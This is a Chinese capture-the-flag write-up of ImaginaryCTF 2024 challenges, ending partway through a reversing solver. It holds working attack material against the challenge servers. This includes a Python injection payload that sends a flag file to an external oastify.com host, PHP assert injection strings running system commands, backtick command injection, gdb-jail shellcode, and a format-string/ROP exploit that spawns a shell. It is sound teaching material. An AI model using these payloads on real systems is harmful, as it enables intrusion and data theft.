# ImaginaryCTF·2024 WriteUp

> 原文: https://www.ctfiot.com/195241.html
> ID: 195241

点击蓝字

关注我们

声明

本文作者：CTF战队本文字数：75781字

阅读时长：约30分钟

附件/链接：点击查看原文下载

本文属于【狼组安全社区】原创奖励计划，未经许可禁止转载

❝

ImaginaryCTF 2024 is a cybersecurity CTF competition run by ImaginaryCTF with a variety of challenges for all skill levels. It runs from July 20 to July 22, starting and ending at 3 AM GMT+8. For more information, check out last year’s challenges from ImaginaryCTF 2023, with over 2000 participants.

https://2024.imaginaryctf.org

WEB

Readme

❝

Description

Try to read the flag.txt file.

Attachments

https://cybersharing.net/s/67af3fd941707117 http://readme.chal.imaginaryctf.org/

flag在源码里给了

P2C

❝

Description

Welcome to Python 2 Color, the world’s best color picker from python code! The flag is located in flag.txt.

Attachments

https://cybersharing.net/s/593d1cd970182e64 http://p2c.chal.imaginaryctf.org/

python code injection

import urllib.request
import subprocess
import urllib.parse

def fetch_data():
    result = subprocess.run(['cat', 'flag.txt'], capture_output=True, text=True)
    flag = result.stdout.strip()  # Get the output and strip any extra whitespace/newlines

    data = urllib.parse.urlencode({'flag': flag}).encode()

    url = "http://sd96d2ywsngcglfawln1iefbn2ttho5d.oastify.com/"

    req = urllib.request.Request(url, data=data)
    response = urllib.request.urlopen(req)
    result = response.read().decode('utf-8')
    return result

result = fetch_data()

Crystals

❝

DescriptionAl₂O₃Attachmentshttps://cybersharing.net/s/c57444a64217c6c7 http://crystals.chal.imaginaryctf.org/

Flag被存在了Hostname中， 直接特殊字符导致报错，拿到flag

GET /asdsad>!@#@!$%@$^# HTTP/1.1
Host: crystals.chal.imaginaryctf.org

Journal

❝

Description

dear diary, there is no LFI in this app

Attachments

https://cybersharing.net/s/6f429753e4ae6d3c http://journal.chal.imaginaryctf.org/

file1.txt' and die(system('ls /')) or '
file1.txt' and die(system("cat /flag-cARdaInFg6dD10uWQQgm.txt")) or '

Assert PHP 代码注入

The Amazing Race

❝

Description

I’ve hidden my flag in an impenetrable maze! Try as you might, even though it’s right there, you’ll never get the flag!

Attachments

http://the-amazing-race.chal.imaginaryctf.org/

条件竞争，给一个空位，疯狂冲撞。什么迷宫不迷宫的，头铁往墙上撞就完事。原理就是：1.数据判断方向能否移动的select查询 和 2.坐标更新的update语句 是不同线程负责的，会导致条件竞争。FLAGictf{turns_out_all_you_need_for_quantum_tunneling_is_to_be_f@st}

Pwn

❝

Description

Back to the old school.

Attachments

https://cybersharing.net/s/9325732cdfe6a6ab nc imgstore.chal.imaginaryctf.org 1337

imgstore

朴实无华的fmt

from pwn import *
io = 

io.recvuntil(b">>")
io.sendline(b"3")
p = b"%17$p%18$p%19$p%25$p"
io.sendline(p)

io.recvuntil(b"0x")
canary = int(io.recv(16),16)
io.recvuntil(b"0x")
buf = int(io.recv(12),16) - 0x7fffffffd350 + 0x7fffffffd2d8
io.recvuntil(b"0x")
pie = int(io.recv(12),16) - 0x21b8
io.recvuntil(b"0x")
__libc_start_main = int(io.recv(12),16) - 243
libc = ELF("./libc.so.6")
libc_base = __libc_start_main - libc.sym['__libc_start_main']
print("[+]libc_base:",hex(libc_base))
sys_addr = libc_base + libc.sym['system']
sh_addr = libc_base + next(libc.search(b"/bin/shx00"))
retaddr = buf + 8*12
bk = 0x1EF1 + pie
io.recvuntil(b"[y/n]: ")
io.sendline(b"y")
io.recvuntil(b"title:")
io.sendline(f"%{bk&0xffff}c%10$hnaaa".encode()+p64(retaddr))
rdi_ret = pie + 0x0000000000002313
ret = pie + 0x000000000000101a
io.recvuntil(b"[y/n]: ")
io.sendline(b"n")
io.recvuntil(b">")
p = b"A"*0x68 + p64(canary) + b"A"*8 +p64(ret) + p64(rdi_ret) + p64(sh_addr) + p64(sys_addr)
io.sendline(p)
io.interactive()

Misc

sanity-check

❝

Description

Welcome to ImaginaryCTF 2024!

Attachments

ictf{this_isnt_real}

ictf{this_isnt_real}

discord

❝

Description

Join our Discord community for updates and support! If you would like to do some more CTF after this competition, we do host daily CTF challenges on our Discord server as well. Join at https://discord.gg/ctf . You can find the flag for this challenge in the #imaginaryctf-2024 channel.

网址：https://discord.com/invite/QxFdGYPd4P

作者

CTF战队

ctf.wgpsec.org

扫描关注公众号回复加群

和师傅们一起讨论研究~

长

按

关

注

WgpSec狼组安全团队

微信号：wgpsec

Twitter：@wgpsec


```
import urllib.request
import subprocess
import urllib.parse

def fetch_data():
    result = subprocess.run(['cat', 'flag.txt'], capture_output=True, text=True)
    flag = result.stdout.strip()  # Get the output and strip any extra whitespace/newlines

    data = urllib.parse.urlencode({'flag': flag}).encode()

    url = "http://sd96d2ywsngcglfawln1iefbn2ttho5d.oastify.com/"

    req = urllib.request.Request(url, data=data)
    response = urllib.request.urlopen(req)
    result = response.read().decode('utf-8')
    return result

result = fetch_data()
```



```
GET /asdsad>!@#@!$%@$^# HTTP/1.1
Host: crystals.chal.imaginaryctf.org
```



```
file1.txt' and die(system('ls /')) or '
file1.txt' and die(system("cat /flag-cARdaInFg6dD10uWQQgm.txt")) or '
```



```
from pwn import *
io = 

io.recvuntil(b">>")
io.sendline(b"3")
p = b"%17$p%18$p%19$p%25$p"
io.sendline(p)

io.recvuntil(b"0x")
canary = int(io.recv(16),16)
io.recvuntil(b"0x")
buf = int(io.recv(12),16) - 0x7fffffffd350 + 0x7fffffffd2d8
io.recvuntil(b"0x")
pie = int(io.recv(12),16) - 0x21b8
io.recvuntil(b"0x")
__libc_start_main = int(io.recv(12),16) - 243
libc = ELF("./libc.so.6")
libc_base = __libc_start_main - libc.sym['__libc_start_main']
print("[+]libc_base:",hex(libc_base))
sys_addr = libc_base + libc.sym['system']
sh_addr = libc_base + next(libc.search(b"/bin/shx00"))
retaddr = buf + 8*12
bk = 0x1EF1 + pie
io.recvuntil(b"[y/n]: ")
io.sendline(b"y")
io.recvuntil(b"title:")
io.sendline(f"%{bk&0xffff}c%10$hnaaa".encode()+p64(retaddr))
rdi_ret = pie + 0x0000000000002313
ret = pie + 0x000000000000101a
io.recvuntil(b"[y/n]: ")
io.sendline(b"n")
io.recvuntil(b">")
p = b"A"*0x68 + p64(canary) + b"A"*8 +p64(ret) + p64(rdi_ret) + p64(sh_addr) + p64(sys_addr)
io.sendline(p)
io.interactive()
```



```
ictf{this_isnt_real}
```



```
ictf{fake_flag_for_testing}
```



```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import binascii

context(arch="amd64", endian='el', os="linux")
context.log_level = "debug"

sc = asm(shellcraft.cat('/home/user/flag.txt'))

p = remote('gdbjail1.chal.imaginaryctf.org', 1337)

p.sendlineafter(b'(gdb) ', b'break')
p.recvuntil(b' at ')
buf = int(p.recvuntil(b': file')[:-6], 16)

for i in range(0, len(sc), 4):
    idx = i+4
    if idx >= len(sc):
        idx = len(sc)
    num = int(binascii.hexlify(sc[i:idx][::-1]), 0x10)
    cmd = 'set *({}+{})={}'.format(buf, i, hex(num))
    print(cmd)
    p.sendlineafter(b'(gdb) ', cmd.encode())

p.sendlineafter(b'(gdb) ', b'continue')
p.interactive()
# ictf{n0_m0re_debugger_a2cd3018}
```



```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import binascii

context(arch="amd64", endian='el', os="linux")

# sc = ''
# sc += shellcraft.pushstr('/home/user/')
# sc += shellcraft.open('rsp', 0, 0)
# # SYS_getdents64
# sc += shellcraft.syscall(217, 'rax', 'rsp', 1000)
# sc += shellcraft.write(1, 'rsp', 1000)

sc = ''
sc += shellcraft.pushstr('/home/user/W4GbJUuvbTGypTHrXAeD.txt')
sc += shellcraft.open('rsp', 0, 0)
sc += shellcraft.read('rax', 'rsp', 1000)
sc += shellcraft.write(1, 'rsp', 1000)
sc = asm(sc)

p = remote('gdbjail2.chal.imaginaryctf.org', 1337)

p.sendlineafter(b'(gdb) ', b'break')
p.recvuntil(b' at ')
buf = int(p.recvuntil(b': file')[:-6], 16)
p.sendlineafter(b'(gdb) ', 'set $rip={}'.format(buf).encode())

for i in range(0, len(sc), 4):
    idx = i+4
    if idx >= len(sc):
        idx = len(sc)
    num = int(binascii.hexlify(sc[i:idx][::-1]), 0x10)
    cmd = 'set *{}={}'.format(buf+i, num)
    print(cmd)
    p.sendlineafter(b'(gdb) ', cmd.encode())

p.sendlineafter(b'(gdb) ', b'continue')
p.interactive()
# ictf{i_l0ve_syscalls_eebc5336}
```



```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context(arch="amd64", endian='el', os="linux")

p = remote('starship.chal.imaginaryctf.org', 1337)

p.sendlineafter(b'> ', b'4')
p.recvuntil(b'target 1: ')
one = p.recvuntil(b' | ')[:-3].split(b',')
p.recvuntil(b'target 2: ')
two = p.recvuntil(b' | ')[:-3].split(b',')

res = []
for i in range(0, len(one)):
    res.append(str((int(one[i]) + int(two[i])) // 2))

res.append('friendly')
res = ','.join(res)

p.sendlineafter(b'> ', b'42')
p.sendlineafter(b'enter data: ', res.encode())
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'> ', b'4')
p.interactive()
# ictf{m1ssion_succ3ss_8fac91385b77b026}
```



```
from pwn import *
# context.log_level = 'debug'
p = remote("ok-nice.chal.imaginaryctf.org", 1337)

out = 'ictf{'
p.recvuntil(b'n')
for i in range(5, 0x20):
    cnt = False
    for j in range(0, 128):
        idx1 = '+'.join(['True'] * i)
        if i == 0:
            idx1 = 'True-True'
        pd = '(ord(flag[{}])-({}))and(fff)'.format(idx1, '+'.join(['True'] * j))
        p.sendlineafter(b'Enter input: ', pd.encode())
        res = p.recvuntil(b'n')[:-1]
        if res == b'error':
            continue
        else:
            out += chr(j)
            cnt = True
            break
    if cnt != True:
        print("{}?".format(i))
    else:
        print(out)
        # input()
print(out)
p.interactive()
# ictf{0k_n1c3_7f4d3e5a6b}
```



```
Enter name: `find / -name flag.txt`
Hello, /home/user/.cache/bazel/_bazel_user/8c069df52082beee3c95ca17836fb8e2/execroot/_main/flag.txt
/app/flag.txt!
```



```
Enter name: `cat /app/flag.txt`
Hello, ictf{I_supp0se_if_a_hacker_can_run_bazel_on_your_system_things_are_already_bad}!
```



```
socat FILE:`tty`,raw,echo=0 TCP:left-in-the-dark.chal.imaginaryctf.org:1337
```



```
from pwn import *
import sys
import time
sys.setrecursionlimit(1000000)

context.log_level = 'debug'

p = remote("left-in-the-dark.chal.imaginaryctf.org", 1337)
# p = process(["./ctf/bin/python3", "./exp.py"])

directions = ['w', 'a', 's', 'd']
ox = 1
oy = 1
n = 40
maze = [[-1 for y in range(oy+n+1)] for x in range(ox+n+1)]
dx = [-1,0,1,0]
dy = [0,-1,0,1]

def show(x, y):
    print()
    for i in range(0, ox+n+1):
        for j in range(0, oy+n+1):
            if i == x and y == j:
                print(".", end="")
                continue
            if maze[i][j] == 0:
                print(" ", end="")
            elif maze[i][j] == 1:
                print("#", end="")
            else:
                print("M", end="")
        print()

def send_command(direction: str):
    p.sendline((direction + "r").encode())
    try:
        return p.recvuntil(b'rn', timeout=0.8).strip()
    except:
        return b''

def dfs(_x, _y):
    maze[_x][_y] = 0
    for ii in range(0, 4):
        xx = _x + dx[ii]
        yy = _y + dy[ii]
        if maze[xx][yy] != -1 or xx == 0 or xx == n+1 or yy == 0 or yy == n+1:
            continue
        _tmp = send_command(directions[ii])
        if _tmp == b"BONK":
            _tmp = send_command(directions[ii])
            if _tmp == b"BONK":
                maze[xx][yy] = 1
                continue
        elif _tmp == b"F":
            print(p.recv())
            exit(0)
        dfs(xx, yy)
        if ii & 1:
            send_command(directions[4 - ii])
        else:
            send_command(directions[2 - ii])
    return _x, _y

p.recvuntil('WASD to move.rn')
p.sendline("r")
position = dfs(ox, oy)
show(position[0], position[1])
p.interactive()
# ictf{glad_you_f0und_the_right_way_to_the_exit}
```



```
print(''.join([chr(ord(i)^5) for i in 'lfqc~opvqZdkjqm`wZcidbZfm`fn`wZd6130a0`0``761gdx']))
#ictf{just_another_flag_checker_a3465d5e5ee234ba}
```



```
def shrinkBFCode(code):
    cPos2Vars = {}   #位置对应的变量
    cPos2Change = {}  #位置中 + 号 增加的值
    varPos = 0
    nCode = []
    incVal = 0
    lc = None
    dataChangeOp = set(['+', '-'])
    dataShiftOp = set(['>', '<'])
    for i in range(len(code)):
        c = code[i]
        if c not in dataChangeOp and lc in dataChangeOp:
            cPos2Change[len(nCode)] = incVal
            cPos2Vars[len(nCode)] = varPos
            nCode.append('+')
            incVal = 0
        if c == '>':
            varPos += 1
        elif c == '<':
            varPos -= 1
        else:
            if c in dataChangeOp:
                incVal += 1 if c == '+' else -1
            else:
                #if lc == '>' or lc == '<':
                #    cPos2Vars[len(nCode)] = varPos
                cPos2Vars[len(nCode)] = varPos
                nCode.append(c)
        lc = c
    return ''.join(nCode), cPos2Vars, cPos2Change
def generatePyCode(shellCode, pVars, pChange):
    pyCodes = []
    bStacks = []
    whileVarCache = {}
    for i, c in enumerate(shellCode):
        d_pos = i if i not in pVars else pVars[i]
        d_change = 1 if i not in pChange else pChange[i]
        indentLevel = len(bStacks)
        indentStr = ' '*(4*indentLevel)
        if c == '[':
            pyCodes.append('{}while data[{}] != 0:'.format(indentStr, d_pos))
            bStacks.append((c, i))
            whileVarCache[i] = {}
        elif c == ']':
            if bStacks[-1][0] != '[':
                raise Exception('miss match of {}] found between {} and {}'.format(bStacks[-1][0], bStacks[-1][1], i))
            cNum = i-bStacks[-1][1]
            if cNum == 2:
                del pyCodes[-1]
                del pyCodes[-1]
                d_pos_l = i-1 if i-1 not in pVars else pVars[i-1]
                pyCodes.append('{}data[{}] = 0'.format(' '*(4*(indentLevel-1)), d_pos_l))
            whileCode = shellCode[bStacks[-1][1]+1 : i]
            if cNum>2 and '[' not in whileCode and not '%' in whileCode:  # nested loop is a bit complicated, just skip
                loopCondvar = bStacks[-1][1]
                d_pos_l = loopCondvar if loopCondvar not in pVars else pVars[loopCondvar]
                whileVars = whileVarCache[bStacks[-1][1]]
                cVarChange = whileVars[d_pos_l]
                # remove statement of same indent
                while len(pyCodes)>0 and pyCodes[-1].startswith(indentStr) and pyCodes[-1][len(indentStr)]!=' ':
                    pyCodes.pop()
                pyCodes.pop()
                #del pyCodes[bStacks[-1][1]-i:]
                for vPos, vChange in whileVars.items():
                    if vPos == d_pos_l:
                        continue
                    ctimes = abs(vChange / cVarChange)
                    ctimesStr = '' if ctimes==1 else '{}*'.format(ctimes)
                    cSign = '+' if vChange > 0 else '-'
                    pyCodes.append('{}data[{}] {}= {}data[{}]'.format(' '*(4*(indentLevel-1)),
                                                                        vPos, cSign,  ctimesStr, d_pos_l))
                pyCodes.append('{}data[{}] = 0'.format(' '*(4*(indentLevel-1)), d_pos_l))
            del whileVarCache[bStacks[-1][1]]
            bStacks.pop()
        elif c == '.':
            pyCodes.append('{}print(data[{}])'.format(indentStr, d_pos))
        elif c == ',':
            pyCodes.append('{}data[{}] = ord(stdin.read(1))'.format(indentStr, d_pos))
        elif c == '+':
            opSign = '-=' if d_change < 0 else '+='
            if pyCodes and pyCodes[-1] == '{}data[{}] = 0'.format(indentStr, d_pos):
                pyCodes[-1] = '{}data[{}] = {}'.format(indentStr, d_pos, d_change)
            else:
                pyCodes.append('{}data[{}] {} {}'.format(indentStr, d_pos, opSign, abs(d_change)))
            if bStacks:
                whileVarCache[bStacks[-1][1]].setdefault(d_pos, 0)
                whileVarCache[bStacks[-1][1]][d_pos] += d_change
        elif c == '-':
            opSign = '+=' if d_change < 0 else '-='
            if pyCodes and pyCodes[-1] == '{}data[{}] = 0'.format(indentStr, d_pos):
                pyCodes[-1] = '{}data[{}] = {}'.format(indentStr, d_pos, -d_change)
            else:
                pyCodes.append('{}data[{}] {} {}'.format(indentStr, d_pos, opSign, abs(d_change)))
            if bStacks:
                whileVarCache[bStacks[-1][1]].setdefault(d_pos, 0)
                whileVarCache[bStacks[-1][1]][d_pos] -= d_change
        elif c == '%':
            pyCodes.append('{}data[{}] %= data[{}]'.format(indentStr, d_pos, d_pos+1))
    return 'n'.join(pyCodes)
target=',>>+++++++++++[<+++>-]<[-<+>]<------------------------------------------------------------------------------------------------------------------------------------------[><],>>++++++++++[<+++++++>-]<[-<+>]<-------------------------------------------------------------------------------------------------------------------------------------------------------------------------[><],>>+++++++++++[<++++>-]<[-<+>]<----------------------------------------------------------------------------------------------------------------------------------------------------------------[><],>>++++++++++[<+++++++>-]<[-<+>]<----------------------------------------------------------------------------------------------------------------------------------------------------------------------------[><],>>+++++++++++++++++[<+++>-]<[-<+>]<------------------------------------------------------------------------------------------------------------------------------------------------------------------------------[><],>>++++++++[<++++++++>-]<[-<+>]<-----------------------------------------------------------------------------------------------------------------[><],>>+++++++++++++[<+++++>-]<[-<+>]<----------------------------------------------------------------------------------------------------------------------------------------------------------------[><],>>+++++++++++[<++++>-]<[-<+>]<----------------------------------------------------------------------------------------------------------------------------------------------------[><],>>++++++[<+++++>-]<[-<+>]<----------------------------------------------------------------------------------[><],>>+++++++++++[<+++++>-]<[-<+>]<---------------------------------------------------------------------------------------------------------------------------------------------------------------------------[><],>>+++++++++[<+++++++>-]<[-<+>]<------------------------------------------------------------------------------------------------------------------[><],>>+++++++++++[<+++>-]<[-<+>]<--------------------------------------------------------------------------------------------------------------------------------[><],>>+++++++++++++++++[<+++>-]<[-<+>]<------------------------------------------------------------------------------------------------------[><],>>+++++++++++[<+++++>-]<[-<+>]<--------------------------------------------------------------------------------------------------------------------------------------------------------------------------[><],>>++++++++[<+++++++>-]<[-<+>]<--------------------------------------------------------------------------------------------------------[><],>>++++++[<+++++>-]<[-<+>]<------------------------------------------------------------------------------------------------------------------------------------------[><],>>++++++++[<+++++++>-]<[-<+>]<------------------------------------------------------------------------------------------------------------[><],>>+++++++++[<+++++++>-]<[-<+>]<-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------[><],>>++++++[<+++++>-]<[-<+>]<-------------------------------------------------------------------------------------------------------------------------------------[><],>>+++++++++[<+++++>-]<[-<+>]<--------------------------------------------------------------------------------------------------[><],>>++++++++++[<+++++>-]<[-<+>]<-------------------------------------------------------------------------------------------------------------------------------------------------[><],>>++++++++++[<+++++++>-]<[-<+>]<-----------------------------------------------------------------------------------------------------------------------------[><],>>++++++++++[<+++++++>-]<[-<+>]<--------------------------------------------------------------------------------------------------------------------------------------------------------------------------[><],>>++++++++++[<++++++>-]<[-<+>]<----------------------------------------------------------------------------------------------------------------[><],>>+++++++++++++++++[<+++>-]<[-<+>]<---------------------------------------------------------------------------------------------------------------------------------------------------------[><],>>+++++++++++[<++++>-]<[-<+>]<-----------------------------------------------------------------------------------------------[><],>>+++++++++++++++++++++++[<++>-]<[-<+>]<-----------------------------------------------------------------------------------------------------------------------------------------------[><],>>+++++++++++++++++++++++[<+++>-]<[-<+>]<----------------------------------------------------------------------------------------------------------------------[><],>>+++++++++++++++++++[<+++>-]<[-<+>]<-----------------------------------------------------------------------------------------------------------------------------------------------------------[><],>>++++++[<+++++>-]<[-<+>]<-----------------------------------------------------------------------------------------------------------------------------------------------------------[><]'
shrinkCode, pVars, pChange = shrinkBFCode(target)
print(generatePyCode(shrinkCode, pVars, pChange))
```



```
flag=[138-3*11,169-7*10,160-11*4,172-7*10,174-17*3,113-8*8,160-5*13,148-11*4,82-5*6,171-5*11,114-9*7,128-3*11,102-3*17,170-5*11,104-7*8,138-5*6,108-7*8,173-9*7,133-5*6,98-5*9,145-5*10,125-10*7,170-10*7,112-6*10,153-17*3,95-4*11,143-23*2,118-23*3,155-19*3,155-5*6]
print(''.join(chr(x) for x in flag))
#ictf{1_h4t3_3s0l4ng5_7d4f3a1b}
```



```
import z3

length=43

a=[z3.BitVec('a{}'.format(i),8) for i in range(length)]

x=z3.Solver()
    
# for i in range(length):
#     x.add(a[i]>=32)
#     x.add(a[i]<=125)

# 定义字符的ASCII码范围
for i in range(5,length-1):
    char=a[i]
    is_digit = z3.And(z3.UGE(char, ord('0')), z3.ULE(char, ord('9')))
    is_uppercase = z3.And(z3.UGE(char, ord('A')), z3.ULE(char, ord('Z')))
    is_lowercase = z3.And(z3.UGE(char, ord('a')), z3.ULE(char, ord('z')))
    is_special = z3.Or(char == ord('_'))
    constraints = z3.Or(is_digit, is_uppercase, is_lowercase, is_special)
    x.add(constraints)

     
x.add(a[0]==ord('i'))
x.add(a[1]==ord('c'))
x.add(a[2]==ord('t'))
x.add(a[3]==ord('f'))
x.add(a[4]==ord('{'))

s1=[0x348A627D10659,0x27485A840365FE61,0x9E735DADF26D31CD,0x82714BC9F9B579D9,0x3DFB7CC801D16BC9,0x602A04EFE5DAD659,0x0EB801D915A30D3D,0x217DBE10EDCB20A1,0x0ADEE2637E875CA19,0x0CD44AED238E9871,0x0D3BFF76AE6B504D,0x7181426EFF59E789,0x477616CB20C2DAC9,0x0CE1206E1E46CE4A9,0x946E7CB964A3F87D,0x499607CBF0C3291,0x6871D4372347C759,0x75412F56B7D8B01,0x0F8E57C264786E34D,0x194CA6020EC505B9,0x3E1A22E34FE84949,0x0A46DE25172742B79,0x0CD0E971BCBFE6E3D,0x56561961138A2501,0x78D2B538AB53CA19,0x0A9980CA75AB6D611,0x5F81576B5D4716CD,0x17B9860825B93469,0x0C012F75269298349,0x17373EE9C7A3AAC9,0x0B2E50798B11E1A7D,0x0ADA5A6562E0FD7F1,0x0EC3D9A68F1C99E59,0x3D828B35505D79A1,0x0F76E5264F7BD16CD,0x0DD230B3EC48ED399,0x80D93363DCD354C9,0x7031567681E76299,0x8977338CD4E2A93D,0x8A5708A1D4C02B61,0x2066296A21501019,0x9E260D94A4D775B1,0x0E7667BBD72280F4D,0x12DF4035E1684349]
for i in range(2,length+3):
    tmp = z3.BitVec('tmp_{}'.format(i), 64)
    tmp = 0
    for j in range(0x2a,-1,-1):
        temp = z3.BitVec('temp_{}'.format(i),64)
        temp = pow(i,j) &0xffffffffffffffff
        tmp += a[0x2b-j-1]*temp
    x.add(tmp == s1[i-2])

if x.check()==z3.sat:
    print("success")
    m=x.model()
    for i in a:
        if m[i] is not None:
                print(chr(m[i].as_long()),end='')
    print("")
else:
    print("failed")
```



```
s1=[-42148619422891531582255418903, -42148619422891531582255418927, -42148619422891531582255418851, -42148619422891531582255418907, -42148619422891531582255418831, -42148619422891531582255418859, -42148619422891531582255418855, -42148619422891531582255419111, -42148619422891531582255419103, -42148619422891531582255418687, -42148619422891531582255418859, -42148619422891531582255419119, -42148619422891531582255418843, -42148619422891531582255418687, -42148619422891531582255419103, -42148619422891531582255418907, -42148619422891531582255419107, -42148619422891531582255418915, -42148619422891531582255419119, -42148619422891531582255418935, -42148619422891531582255418823]
# print(len(s1))
# print(hex(s1[0]&(2**128-1)))        #0xffffffff77cf7aaab8c8c7c97de7b1e9

# num = s1[0]
# num_bits = num & ((1 << 128) - 1)   
# tmp = ~num_bits & ((1 << 128) - 1)
# hex_result = hex(tmp)
# print(hex_result)                   #0x883085554737383682184e16             取反后的值
# tmp-=0x539
# print(hex(tmp))                     #0x8830855547373836821848dd             取反再减0x539的值
# tmp^=0x1a4
# print(hex(tmp))                     #0x883085554737383682184979             异或前的值，即key

for i in range(len(s1)):
    num = s1[i]
    num_bits = num & ((1 << 128) - 1)   
    tmp = ~num_bits & ((1 << 128) - 1)
    tmp-=0x539
    tmp^=0x883085554737383682184979
    tmp>>=2
    print(chr(tmp),end='')
print('')
#ictf{ru57_r3v_7f4d3a}
```



```
import z3

length=47

a=[z3.Int('a{}'.format(i)) for i in range(length)]

x=z3.Solver()

for i in range(length):
    x.add(a[i]>=32)
    x.add(a[i]<=127)

x.add(a[0]==ord('i'))
x.add(a[1]==ord('c'))
x.add(a[2]==ord('t'))
x.add(a[3]==ord('f'))
x.add(a[4]==ord('{'))

v3=487*a[30]+188*a[29]+145*a[28]+365*a[27]+132*a[26]+635*a[25]+278*a[24]+931*a[23]+871*a[22]+954*a[21]+260*a[20]+246*a[19]+71*a[18]+845*a[17]+357*a[16]+669*a[15]+567*a[14]+659*a[13]+610*a[10]+996*a[9]+411*a[8]+888*a[7]+515*a[6]+826*a[5]+584*a[4]+812*a[3]+426*a[2]+290*a[1]+660*a[0]+139*a[11]+21*a[12]+524*a[31];
x.add(740*a[45]+338*a[44]+317*a[43]+626*a[42]+680*a[41]+335*a[40]+575*a[39]+448*a[38]+621*a[37]+330*a[36]+151*a[35]+951*a[34]+525*a[33]+v3+160*a[32]+813*a[46]==2418373)
v4=506*a[40]+882*a[39]+880*a[38]+877*a[37]+298*a[36]+195*a[35]+984*a[34]+706*a[33]+422*a[32]+125*a[31]+641*a[30]+651*a[29]+859*a[28]+629*a[27]+220*a[26]+925*a[25]+62*a[24]+212*a[23]+323*a[22]+725*a[21]+660*a[20]+853*a[19]+477*a[18]+374*a[17]+899*a[16]+953*a[15]+462*a[14]+195*a[13]+472*a[12]+909*a[11]+162*a[10]+222*a[9]+281*a[8]+799*a[7]+1018*a[6]+738*a[5]+205*a[4]+444*a[3]+886*a[2]+573*a[1]+9*a[0]+677*a[41]+13*a[42];
x.add( 35 * a[44] + 267 * a[43] + v4 + 917 * a[45] + 576 * a[46] == 2519130 )
v5=335*a[30]+54*a[29]+262*a[28]+867*a[27]+51*a[26]+430*a[25]+490*a[24]+69*a[23]+494*a[22]+245*a[21]+103*a[20]+540*a[19]+956*a[18]+475*a[17]+687*a[16]+658*a[15]+521*a[14]+205*a[13]+112*a[12]+808*a[11]+79*a[10]+731*a[9]+713*a[8]+996*a[7]+50*a[6]+523*a[5]+393*a[4]+59*a[3]+988*a[2]+479*a[1]+425*a[0]+315*a[31];
x.add(891*a[45]+621*a[44]+563*a[43]+811*a[42]+896*a[41]+807*a[40]+631*a[39]+682*a[38]+996*a[37]+861*a[36]+207*a[35]+667*a[34]+392*a[33]+v5+576*a[32]+529*a[46]==2410525)
v6=160*a[8]+790*a[6]+941*a[5]+1001*a[4]+498*a[3]+786*a[2]+588*a[1]+(a[0]*64)+429*a[7];
x.add(148*a[45]+115*a[44]+452*a[43]+816*a[42]+872*a[41]+682*a[40]+498*a[39]+629*a[38]+415*a[37]+744*a[36]+557*a[35]+946*a[34]+987*a[33]+178*a[32]+238*a[31]+333*a[30]+627*a[29]+678*a[28]+1019*a[27]+916*a[26]+372*a[25]+293*a[24]+899*a[23]+263*a[22]+472*a[21]+832*a[20]+123*a[19]+742*a[18]+4*a[17]+486*a[16]+569*a[15]+505*a[14]+903*a[13]+333*a[12]+848*a[11]+925*a[10]+v6+15*a[9]+340*a[46]==2636936)
v7=5*a[8]+514*a[6]+823*a[5]+67*a[4]+609*a[3]+383*a[2]+874*a[1]+666*a[0]+605*a[7]+21*a[9]+314*a[10];
x.add(610*a[45]+658*a[44]+936*a[43]+(a[42]*512)+880*a[41]+378*a[40]+204*a[39]+228*a[38]+91*a[37]+189*a[36]+98*a[35]+313*a[34]+238*a[33]+700*a[32]+559*a[31]+56*a[30]+892*a[29]+342*a[28]+973*a[27]+381*a[26]+138*a[25]+517*a[24]+507*a[23]+324*a[22]+193*a[21]+309*a[20]+547*a[19]+996*a[18]+274*a[17]+230*a[16]+43*a[15]+651*a[14]+296*a[13]+645*a[12]+v7+127*a[11]+188*a[46]==2001991)
v8=111*a[42]+692*a[41]+279*a[40]+456*a[39]+926*a[38]+716*a[37]+535*a[36]+389*a[35]+565*a[34]+331*a[33]+171*a[32]+782*a[31]+764*a[30]+1001*a[29]+633*a[28]+847*a[27]+861*a[26]+296*a[25]+317*a[24]+901*a[23]+597*a[22]+175*a[21]+335*a[20]+441*a[19]+411*a[18]+741*a[17]+114*a[16]+632*a[15]+273*a[14]+976*a[13]+222*a[12]+982*a[11]+105*a[10]+301*a[9]+142*a[8]+420*a[7]+795*a[6]+978*a[5]+204*a[4]+751*a[3]+645*a[2]+67*a[1]+509*a[0];
x.add( 760 * a[45] + 457 * a[44] + 1020 * a[43] + v8 + 985 * a[46] == 2616456 )
v9=542*a[38]+401*a[37]+811*a[36]+271*a[35]+111*a[34]+208*a[33]+753*a[32]+637*a[31]+151*a[30]+504*a[29]+886*a[28]+707*a[27]+480*a[26]+639*a[25]+183*a[24]+1011*a[23]+746*a[22]+107*a[21]+45*a[20]+330*a[19]+583*a[18]+541*a[17]+905*a[16]+925*a[15]+596*a[14]+601*a[13]+174*a[12]+153*a[9]+750*a[8]+204*a[7]+738*a[6]+402*a[5]+391*a[4]+153*a[3]+862*a[2]+862*a[0]+5*a[1]+88*a[10]+5*a[11]+873*a[39];
x.add( 176 * a[45] + 421 * a[44] + 399 * a[43] + 83 * a[42] + 966 * a[41] + v9 + 37 * a[40] + 409 * a[46] == 2226206 )
v10=942*a[26]+52*a[25]+468*a[24]+298*a[23]+438*a[22]+301*a[21]+549*a[20]+607*a[19]+699*a[18]+313*a[17]+932*a[16]+628*a[15]+209*a[14]+972*a[13]+398*a[12]+506*a[11]+940*a[10]+377*a[9]+450*a[8]+245*a[7]+560*a[6]+880*a[5]+236*a[4]+382*a[3]+59*a[2]+54*a[1]+237*a[0]+606*a[27];
x.add(647*a[45]+759*a[44]+585*a[43]+904*a[42]+791*a[41]+690*a[40]+438*a[39]+463*a[38]+981*a[37]+577*a[36]+314*a[35]+238*a[34]+796*a[33]+918*a[32]+385*a[31]+743*a[30]+444*a[29]+v10+36*a[28]+446*a[46]==2438804)
v11=295*a[29]+535*a[28]+250*a[27]+152*a[26]+108*a[25]+498*a[24]+430*a[23]+484*a[22]+628*a[21]+961*a[20]+540*a[19]+579*a[18]+61*a[17]+468*a[16]+612*a[15]+124*a[14]+1004*a[13]+964*a[12]+311*a[11]+34*a[10]+948*a[9]+720*a[8]+616*a[7]+534*a[6]+773*a[5]+376*a[4]+431*a[3]+575*a[2]+503*a[1]+601*a[0]+302*a[30];
